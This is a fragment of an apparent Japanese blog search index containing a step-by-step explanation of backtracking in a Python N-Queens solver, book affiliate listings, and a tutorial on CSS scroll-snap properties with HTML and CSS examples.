","date":"2022-02-16T18:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-16-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-16-01-ani/","title":"第8回 pythonでNQueen（エイトクイーン）対象解除法（1）"},{"content":"バックトラック 今回も引き続きバックトラックを説明していきたいと思います。 前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰とバックトラックの動きについて図で示しながら説明していきたいとおもいます。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\nおさらい ブルートフォース、配置フラグからのおさらいとして次の点を押さえておきましょう。 ・448行目のABOARD[row]=i はクイーンを配置する動きです。 ・452行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。 ・444,445は最終行(4行目)までクイーンを置ききった後にTOTALに1加算しています。フラグチェックを通過して最終行まで到達すれば正解と判断して良いからです。\n再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭439行目に移動します。\n引数で渡されたrow、size以外のローカル変数はすべて初期化された状態になります。\n・再帰から抜ける部分は2箇所あります。\n一つ目は、444,445行目で最終行(4行目)までクイーンを置ききった後にTOTALを加算する時\n二つ目は、447行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。\n再帰から抜けたときは再帰を呼び出した452行目のすぐ後ろからスタートします。\nローカル変数の状態は再帰を呼び出す直前の状態になります。\n1行前に戻るような動きとなります。\nちなみに447行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。\n左端までクイーンを置ききったらfor文を抜けるイメージです。\n450行目のif FA[i] == 0 and FB[row-i+(size-1)] == 0 and FC[row+i] == 0:でFA,FB,FCの配置フラグで利き筋をチェックしています。\nFAが上下の利き筋\nFBが左対角線上の利き筋\nFCが右対角線上の利き筋\nをチェックしています\nnqueen メソッドの動き 467行目のnqueen(0,i)からスタートします。\nメソッドの先頭439行目に移動します。\nrow=0なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\n448行目のABOARD[0]=0で1行目の右端にクイーンを設置します。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。\n451行目でフラグを立てますが以下のようになります。\n配列の個数は2MAX-1 MAX=16なので31個ですが31個必要なのはN=16の時です。\nN=4のときは24-1で7個あれば足ります。\nrow=0,i=0なので\nFA\nFA[0]=1で\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n0-0+(4-1)=3\nFB[3]=1\nFB[0]=0 FB[1]=0 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n0+0=0\nFC[0]=1\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。\n図 452行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n図だと2行目でクイーンを置けるのは3,4列目ですがプログラムの動きではどうなるのか見てみましょう。\n再帰呼び出しなのでrow=1の状態でメソッドの先頭439行目に移動します。\nrow=1なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\n448行目のABOARD[1]=0で2行目の右端にクイーンを設置します。\n1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので450行目のif FA[i]==0の条件を満たしません。\nif文に入らずに次のfor文に進みます。\nこの部分が配置フラグの制御になります。\nこの処理のおかげで上下、左右対角線上の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。\n447行目で次のfor文に進みi=1となります。\n448行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。\n450行目でフラグをチェックします\nFAのフラグの状態は以下の通りです\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 i=1\nFA[1]==0ですのでFAフラグは通過します。\nFBのフラグの状態は以下の通りです\nFA[0]=0 FB[1]=0 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 row=1,i=1\nrow-i+(size-1)\n1-1+(4-1)=3\nFB[3]==1ですのでFBフラグは通過しません\n左対角線上の利き筋に引っかかることになります。\n447行目で次のfor文に進みi=2となります。\n448行目のABOARD[1]=2で2行目の右から3列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=1,i=2\nFA[2]==0なのでFAのフラグは通過しますFB[row-i+(size-1)-\u0026gt;FB[1-2+(4-1)]-\u0026gt;FB[2]==0なのでFBフラグは通過します\nFC[row+i]-\u0026gt;FC[1+2]-\u0026gt;FC[3]==0なのでFCフラグも通過します\nif 文の中に入って451行目でフラグをたてます\nFA\nFA[2]=1で\nFA[0]=1 FA[1]=0 FA[2]=1 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[2]=1\nFB[0]=0 FB[1]=0 FB[2]=1 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1 FC[4]=0 FC[5]=0 FC[6]=0 ビジュアルで利き筋をみてみると以下の通りです。\n図 3行目にクイーンを置ける場所はなさそうです。\n452行目でnqueenを引数2を渡して呼び出して3行目に進みます。\nrow=2,for=0,1,2,3 で450行目のフラグを見てみましょう\nrow=2,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\nrow=2,i=1\nFA[i]-\u0026gt;FA[1]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-1+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[2+1]-\u0026gt;FC[3]==1\nFCフラグに引っかかります\nrow=2,i=2\nFA[i]-\u0026gt;FA[2]==1\nFAフラグに引っかかります\nrow=2,i=3\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-3+(4-1)]-\u0026gt;FB[2]==0\nFBフラグに引っかかります\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。\nrow=1,i=2\n453行目でフラグを落とします\n今の状態のフラグが以下の通りです。\nFA\nFA[2]=1 のフラグを0にします。\nFA[0]=1 FA[1]=0 FA[2]=1--\u0026gt;FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[2]=1 のフラグを0にします。\nFB[0]=0 FB[1]=0 FB[2]=1--\u0026gt;FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを0にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1--\u0026gt;FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 447行目で次のfor文に進みi=3となります。\n448行目のABOARD[1]=3で2行目の右から4列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=1,i=3\nフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[1-3+(4-1)]-\u0026gt;FB[1]==0\nFC[row+i]-\u0026gt;FC[1+3]-\u0026gt;FC[4]==0\nFA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。\n451行目でフラグをたてると以下のようになります。\nFA\nFA[3]=1 のフラグを1にします。\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[1]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[4]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 図 452行目でnqueenを引数2を渡して呼び出して3行目に進みます。 再帰呼び出しなのでrow=2の状態でメソッドの先頭439行目に移動します。 row=2なので446行目の else: に移動します。 447行目のfor文に入りi=0からスタートします。 448行目のABOARD[2]=0で3行目の右端にクイーンを設置します。\n450行目でフラグをチェックします\nrow=2,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\n447行目で次のfor文に進みi=1となります。\n448行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。\n図 450行目でフラグをチェックします\nrow=2,i=1\nフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[1]==0\nFB[row-i+(size-1)]-\u0026gt;FB[2-1+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[2+1]-\u0026gt;FC[3]==0\nFA,FB,FCいずれのフラグチェックもクリアしますので451行目のif文に入ります。\n451行目でフラグをたてると以下のようになります。\nFA\nFA[1]=1 のフラグを1にします。\nFA[0]=1 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[4]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=1 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=1 FC[4]=1 FC[5]=0 FC[6]=0 図 ビジュアル的にみると4行目にクイーンを置ける場所はなさそうですね。\nプログラムでの動きを見てみましょう\n452行目でnqueenを引数3を渡して呼び出して3行目に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭439行目に移動します。 row=2なので446行目の else: に移動します。\n447行目のfor文に入りi=0からスタートします。\ni=0,1,2,3での450行目のフラグ判定を見てみましょう\nrow=3,i=0\nFA[i]-\u0026gt;FA[0]==1\nFAフラグに引っかかります\nrow=3,i=1\nFA[i]-\u0026gt;FA[1]==1\nFAフラグに引っかかります\nrow=3,i=2\nFA[i]-\u0026gt;FA[2]==0\nFB[row-i+(size-1)]-\u0026gt;FB[3-2+(4-1)]-\u0026gt;FB[4]==1\nFBフラグに引っかかります\nrow=2,i=3\nFA[i]-\u0026gt;FA[3]==0\nFAフラグに引っかかります\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け3行目の処理(row=2)に戻ります。\nrow=2,i=1の状態で452行目の直後に移動します。\n453行目でフラグを落とします\n今の状態のフラグが以下の通りです。\nFA\nFA[1]=1 のフラグを0にします。\nFA[0]=1 FA[1]=0 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nFB[4]=1 のフラグを1にします。\nFB[0]=0 FB[1]=1 FB[2]=0 FB[3]=1 FB[4]=0 FB[5]=0 FB[6]=0 FC\nFC[3]=1 のフラグを1にします。\nFC[0]=1 FC[1]=0 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 フラグを落としたら447行目次のfor文にいきます。\nrow=2,i=2\nrow=2,i=3\nいずれも450行目のフラグに引っかかります。\ni=3までだめなのでfor文を抜けます。\nfor文を抜けると再帰を抜け2行目の処理(row=1)に戻ります。\nrow=1,i=3の状態で452行目の直後に移動します。\nすでにi=3の状態ですからそのままfor文をぬけ再帰を抜けて1行目の処理(row=0)に戻ります。\nrow=0,i=0\n453行目でフラグを落としますが1行目ですのでまっさらな状態になります。\n447行目で次のfor文に移動します。\nrow=0,i=1ですので448行目のABOARD[0]=1 で1行目の右から2列目にクイーンをおきます。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから450行目のif FA[0] == 0 FB[row-i+(size-1)] == 0 FC[row+i] == 0の条件を満たしてif文の中に入ります。\n451行目でフラグを立てます\nrow=0,i=1なので\nFA\nFA[1]=1で\nFA[0]=0 FA[1]=1 FA[2]=0 FA[3]=0 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n0-1+(4-1)=2\nFB[2]=1\nFB[0]=0 FB[1]=0 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n0+1=0\nFC[1]=1\nFC[0]=0 FC[1]=1 FC[2]=0 FC[3]=0 FC[4]=0 FC[5]=0 FC[6]=0 利き筋をビジュアルで表示すると以下の通りです。黒いクイーンの部分は置けません。\n図 452行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n図だと2行目でクイーンを置けるのは4列目だけです。\n図 447行目のfor文の中でrow=1 i=0,1,2の時にいずれも450行目の配置フラグの制御に引っかかって次のfor文に進みます。\nrow=1,i=3の時に450行目の配置フラグを通り抜けられます。\nFA[i]-\u0026gt;FA[3]==0\nFB[row-i+(size-1)]-\u0026gt;FB[1-3+(4-1)]-\u0026gt;FB[1]==0\nFC[row+i]-\u0026gt;FC[1+3]-\u0026gt;FC[4]==0\n451行目でフラグを立てると以下の図になります。\n図 row=1,i=3なので\nFA\nFA[3]=1で\nFA[0]=0 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n1-3+(4-1)=1\nFB[1]=1\nFB[0]=0 FB[1]=1 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=0 FB[6]=0 FC\nrow+i\n1+3=0\nFC[4]=1\nFC[0]=0 FC[1]=1 FC[2]=0 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 452行目でrow=2でnqueenを再帰で呼び出します。\nrow=2の時はi=0の時にクイーンを置くことができます。\n図 451行目でフラグを立てると以下の図になります。\nrow=2,i=0なので\nFA\nFA[0]=1で\nFA[0]=1 FA[1]=1 FA[2]=0 FA[3]=1 FA[4]=0 FA[5]=0 FA[6]=0 FB\nrow-i+(size-1)\n2-0+(4-1)=5\nFB[5]=1\nFB[0]=0 FB[1]=1 FB[2]=1 FB[3]=0 FB[4]=0 FB[5]=1 FB[6]=0 FC\nrow+i\n2+0=2\nFC[2]=1\nFC[0]=0 FC[1]=1 FC[2]=1 FC[3]=0 FC[4]=1 FC[5]=0 FC[6]=0 図 図で見ると最終行で右から3番目にクイーンが置けそうです。\n図 452行目でrow=3でnqueenを再帰で呼び出します。\nrow=3,i=2でフラグをチェックしてみましょう。\nFA[i]-\u0026gt;FA[2]==0\nFB[row-i+(size-1)]-\u0026gt;FB[3-2+(4-1)]-\u0026gt;FB[4]==0\nFC[row+i]-\u0026gt;FC[3+2]-\u0026gt;FC[5]==0\n450行目のフラグチェックと通過するので\n452行目でrow=4でnqueenを再帰で呼び出すことができます。\nrow=4で再帰を呼び出すと\nif row== size : のif文に入り\nTOTAL +=1 で総数がカウントされます。\n図 445行目の処理が終わると再帰を抜けて上の行に戻ります。\nそんな感じで再帰呼び出し、再帰を抜けるを繰り返して総数を出します。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-14T17:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-09-01-ani/","title":"第7回 pythonでNQueen（エイトクイーン）バックトラック（3）"},{"content":"出典元： CSS Scroll Snap - Ahmad Shadeed アプリなどで横スクロールしてコンテンツにスナップするといった動作をよく見かけると思いますが、CSSで横スクロールのUIを作成しようとすると、専用のjavascriptやライブラリを使用する必要があったりと実装が大変です。\nしかし、CSSスクロールスナップは横スクロールしてスナップするといった動作を行うことができます。\nこの記事では、CSSスクロールスナップ（scroll-snap）の基本について説明します。\nscroll-snapを使用する理由 スマホやタブレットの普及で、タッチでスワイプできる画面を設計、構築する必要があるかと思います。\nたとえば、ギャラリー風のデザインを考えてみましょう。ユーザーは、階層構造ではなく、左または右に簡単にスワイプして、より多くの画像を表示できます。\nCSSの仕様によると、CSSスクロールスナップを導入することでユーザーエクスペリエンスが向上し、スクロールの実装が容易になり、ユーザーと開発者、双方にメリットがあるということです。\nスクロールコンテナーの基本 スクロールコンテナーを作成するために必要な基本的なものは次のとおりです。\noverflowをvisible以外の値で使用 項目を隣同士（インライン）に表示す 例を見てみましょう。\n\u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 1\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 2\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 3\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 5\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; .section { white-space: nowrap; overflow-x: auto; } 以前まではwhite-space: nowrapを使用することで要素を横並びで表示するようにしていました。\n近年では、この方法の代わりにFlexboxを使用することで表現可能です。\n.section { display: flex; overflow-x: auto; } これは、スクロールコンテナーを作成するための基本的な構成です。\nしかし、これだけではスクロールコンテナーの機能としては不十分です。\n従来の問題 従来の問題は、スワイプの仕組みと比較して、優れたUXが提供されないことです。タッチスクリーンでのスワイプジェスチャの主な利点は、1本の指で水平または垂直にスクロールできることです。\n以前のソリューションでは、ただスクロールするだけです。文字通り、各アイテムをそれぞれの場所に移動する必要があります。これはスワイプではなく、ユーザーにとって非常にストレスを与える結果になってしまします。\nCSSスクロールスナップを使用すると、ユーザーが水平方向または垂直方向にスクロールしやすくなるスナップポイントを定義するだけで、この問題を解決できます。\nCSSスクロールスナップの使用方法を見てみましょう。\nCSSスクロールスナップの紹介 コンテナーでスクロールスナップを使用するには、その子アイテムをinlineで表示する必要があります。これは、上記で説明した方法の1つで実行できます。 CSSフレックスボックスを使用します。\n\u0026lt;div class=\u0026#34;section\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 1\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 2\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 3\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 4\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;section__item\u0026#34;\u0026gt;Item 5\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; .section { display: flex; overflow-x: auto; } さらに、スクロールスナップを機能させるために2つのプロパティを追加します。\nまず、スクロールコンテナーにscroll-snap-typeを追加します。この例では、これは.section要素です。\n次に、子アイテム（.section__item）にscroll-snap-alignを追加します。\n.section { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; } .section__item { scroll-snap-align: start; } x mandatoryとstartの値についてはじめて見たと思われるかもしれませんが、この部分が今回の記事のメインになる部分です。\nこれらのプロパティにより、スクロールコンテナーの開始位置にスナップすることが可能になって、スクロールがより自然になりました。\nそれでは、スクロールスナップのプロパティについて詳しく見ていきましょう。\nscroll-snap-type CSSの仕様 によると、scroll-snap-typeは、ある要素がスクロールスナップコンテナーであるかどうか、どの程度厳密にスナップするか、どの軸を考慮するかを指定するものです。\nそれを解析してみましょう。\nスクロールスナップコンテナーの軸について スクロールスナップコンテナーの軸は、スクロールの方向を表します。水平または垂直にできます。\nxの値は水平方向のスクロールを、yの値は垂直方向のスクロールを表します。\n/* Horizontal */ .section { display: flex; overflow-x: auto; scroll-snap-type: x; } /* Vertical */ .section { height: 250px; overflow-y: auto; scroll-snap-type: y; } スクロールスナップコンテナーの精密さ スクロールスナップの方向だけでなく、その精密さも定義できます。\nこれは、scroll-snap-type値にmandatory | proximityのいずれかの値を使用することで可能です。\nmandatoryは、ブラウザが各スクロールポイントにスナップする必要があることを意味します。scroll-snap-alignプロパティの値がstartであると仮定してみましょう。つまり、スクロールはスクロールコンテナーの開始点にスナップする必要があります。\n下図では、ユーザーが右方向にスクロールするたび、ブラウザはコンテナーの開始点にアイテムをスナップさせます。\n.section { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; } .section__item { scroll-snap-align: start; } 下のデモで右方向にスクロールしてみてください。スクロールバーを右に移動させるか、スマートフォンやタブレットの場合はタッチ操作で行ってください。各アイテムがコンテナーの始まりにスナップする様子が感じられるはずです。\nしかし、値がproximityの場合は、ブラウザが作業を行います。定義された点（この例ではstart）にスナップするかもしれません。proximityはデフォルトの値ですが、わかりやすくするために追加しておきます。\n.section { display: flex; overflow-x: auto; /* proximityはデフォルト値です。 */ scroll-snap-type: x proximity; } スクロールスナップの方向 スクロールコンテナーの子アイテムには、スナップできるアライメントポイントが必要です。\nstart、center、endのいずれかを使用します。\nスクロールコンテナーに磁石があり、スナップポイントを制御するのに役立つと想像してみてください。\nscroll-snap-typeが垂直の場合、スナップの配置は垂直になります。次の図を参照してください。\nこれをより明確にするため、 start 、center、およびendの以下のアニメーションを参照してください。\nスクロールコンテナーの start 子アイテムは、水平スクロールコンテナーの先頭にスナップします。\nスクロールコンテナーの center 子アイテムは、スクロールコンテナーの中央にスナップします。\nスクロールコンテナーの end 子アイテムは、スクロールコンテナーの最後にスナップします。\nscroll-snap-stopを使う ユーザーがあまりに速くスクロールするなど、スクロール中にユーザーが誤って重要な項目をスキップしてしまうのを防ぐ方法が必要な場合もあります。\n.section__item { scroll-snap-align: start; scroll-snap-stop: normal; } スクロールのスピードが速すぎる（勢いよくスクロールする）と、3つも4つも項目が飛ばされることもあります。\nscroll-snap-stop のデフォルト値はnormalです。スクロールを強制的にすべての可能なポイントにスナップするには、alwaysを使用する必要があります。 scroll-snap-stop: alwaysを使用すると、ブラウザは各スナップポイントで停止します。\n.section__item { scroll-snap-align: start; scroll-snap-stop: always; } そうすれば、ユーザーは1つずつスナップポイントをスクロールしていくことができ、重要な項目をスキップすることを避けることができます。\n各ストップポイントにストップサインがあることを想像してください。\nデモで下のスクロールを試して、オプションを切り替えてみてください。\nスクロールスナップのpadding scroll-padding短縮形プロパティは、paddingプロパティの動作と同様に、すべての側面にスクロールパディングを設定します。\n下図では、スクロールコンテナーの左側に50pxのパディングが設定されています。その結果、子要素は左端から50pxずれた位置にスナップします。\n.section { overflow-x: auto; scroll-snap-type: x mandatory; scroll-padding: 0 0 0 50px; } 同じことが垂直スクロールでも機能します。以下の例を参照してください。\n.section { overflow-y: auto; scroll-snap-type: y mandatory; scroll-padding: 50px 0 0 0; } スクロールスナップのmargin scroll-marginショートハンドプロパティは、スクロールコンテナーの子アイテム間の間隔を設定します。要素にマージンが追加されると、マージンに応じてスクロールがスナップします。下図を参照してください。\n.item-2はscroll-margin-left: 20pxとなっています。その結果、スクロールコンテナーはそのアイテムの手前20pxにスナップします。ユーザーが再び右にスクロールしたとき、.item-3はスクロールコンテナーの開始位置にスナップすることに注意してください。つまり、マージンを持つ要素のみが影響を受けることになります。\nCSSスクロールスナップの使用例 画像リスト CSSスクロールスナップの優れた使用例として、画像のリストが挙げられます。スクロールスナップを使用することで、より良いスクロール体験を提供します。\n.images-list { display: flex; overflow-x: auto; scroll-snap-type: x; gap: 1rem; -webkit-overflow-scrolling: touch; /* Important for iOS devices */ } .images-list img { scroll-snap-align: start; } scroll-snap-typeの値としてxを使用したことに注意してください。スナップの厳密さは、デフォルトではproximityになります。\n友達リスト スクロールスナップのもう1つの優れた使用例として、友達のリストがあります。以下の例は、Facebookから引用したものです（実例）。\n.list { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; gap: 1rem; scroll-padding: 48px; padding-bottom: 32px; -webkit-overflow-scrolling: touch; } .list-item { scroll-snap-align: start; } スクロールするコンテナーにはpadding-bottomがあることに注意してください。32pxです。この目的は、ボックスシャドウが期待どおりに表示されるように余分なスペースを提供することです。\nアバターリスト 今回の使用例では、子アイテムのscroll-snap-alignの値としてcenterを使用しています。\n.list { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; -webkit-overflow-scrolling: touch; } .list-item { scroll-snap-align: center; } これはアバターのリストで、アバターがスクロールするコンテナーの中央にあることが重要な場合に便利です。\n全画面を覆うような要素 スクロールスナップの使用は、縦スクロールの場合にも有効です。この例として、フルハイトのセクションがあります。\n\u0026lt;main\u0026gt; \u0026lt;section class=\u0026#34;section section-1\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-2\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-3\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-4\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;section section-5\u0026#34;\u0026gt;\u0026lt;/section\u0026gt; \u0026lt;/main\u0026gt; main { height: 100vh; overflow-y: auto; scroll-snap-type: y mandatory; -webkit-overflow-scrolling: touch; } .section { height: 100vh; scroll-snap-align: start; } ブロックおよびインラインの値 特筆すべきは、scroll-snap-typeにinlineとblockという論理値を使用できることです。以下の例を参照してください。\nmain { scroll-snap-type: inline mandatory; } この例では、英語のような横書きモードでは、inlineが横方向の寸法を表します。日本語のような言語では、inlineは縦方向の寸法を表すことになります。\nCSSの論理プロパティについてもっと知りたい方は、Adrian Roselliの記事 をご覧ください。\nアクセシビリティ 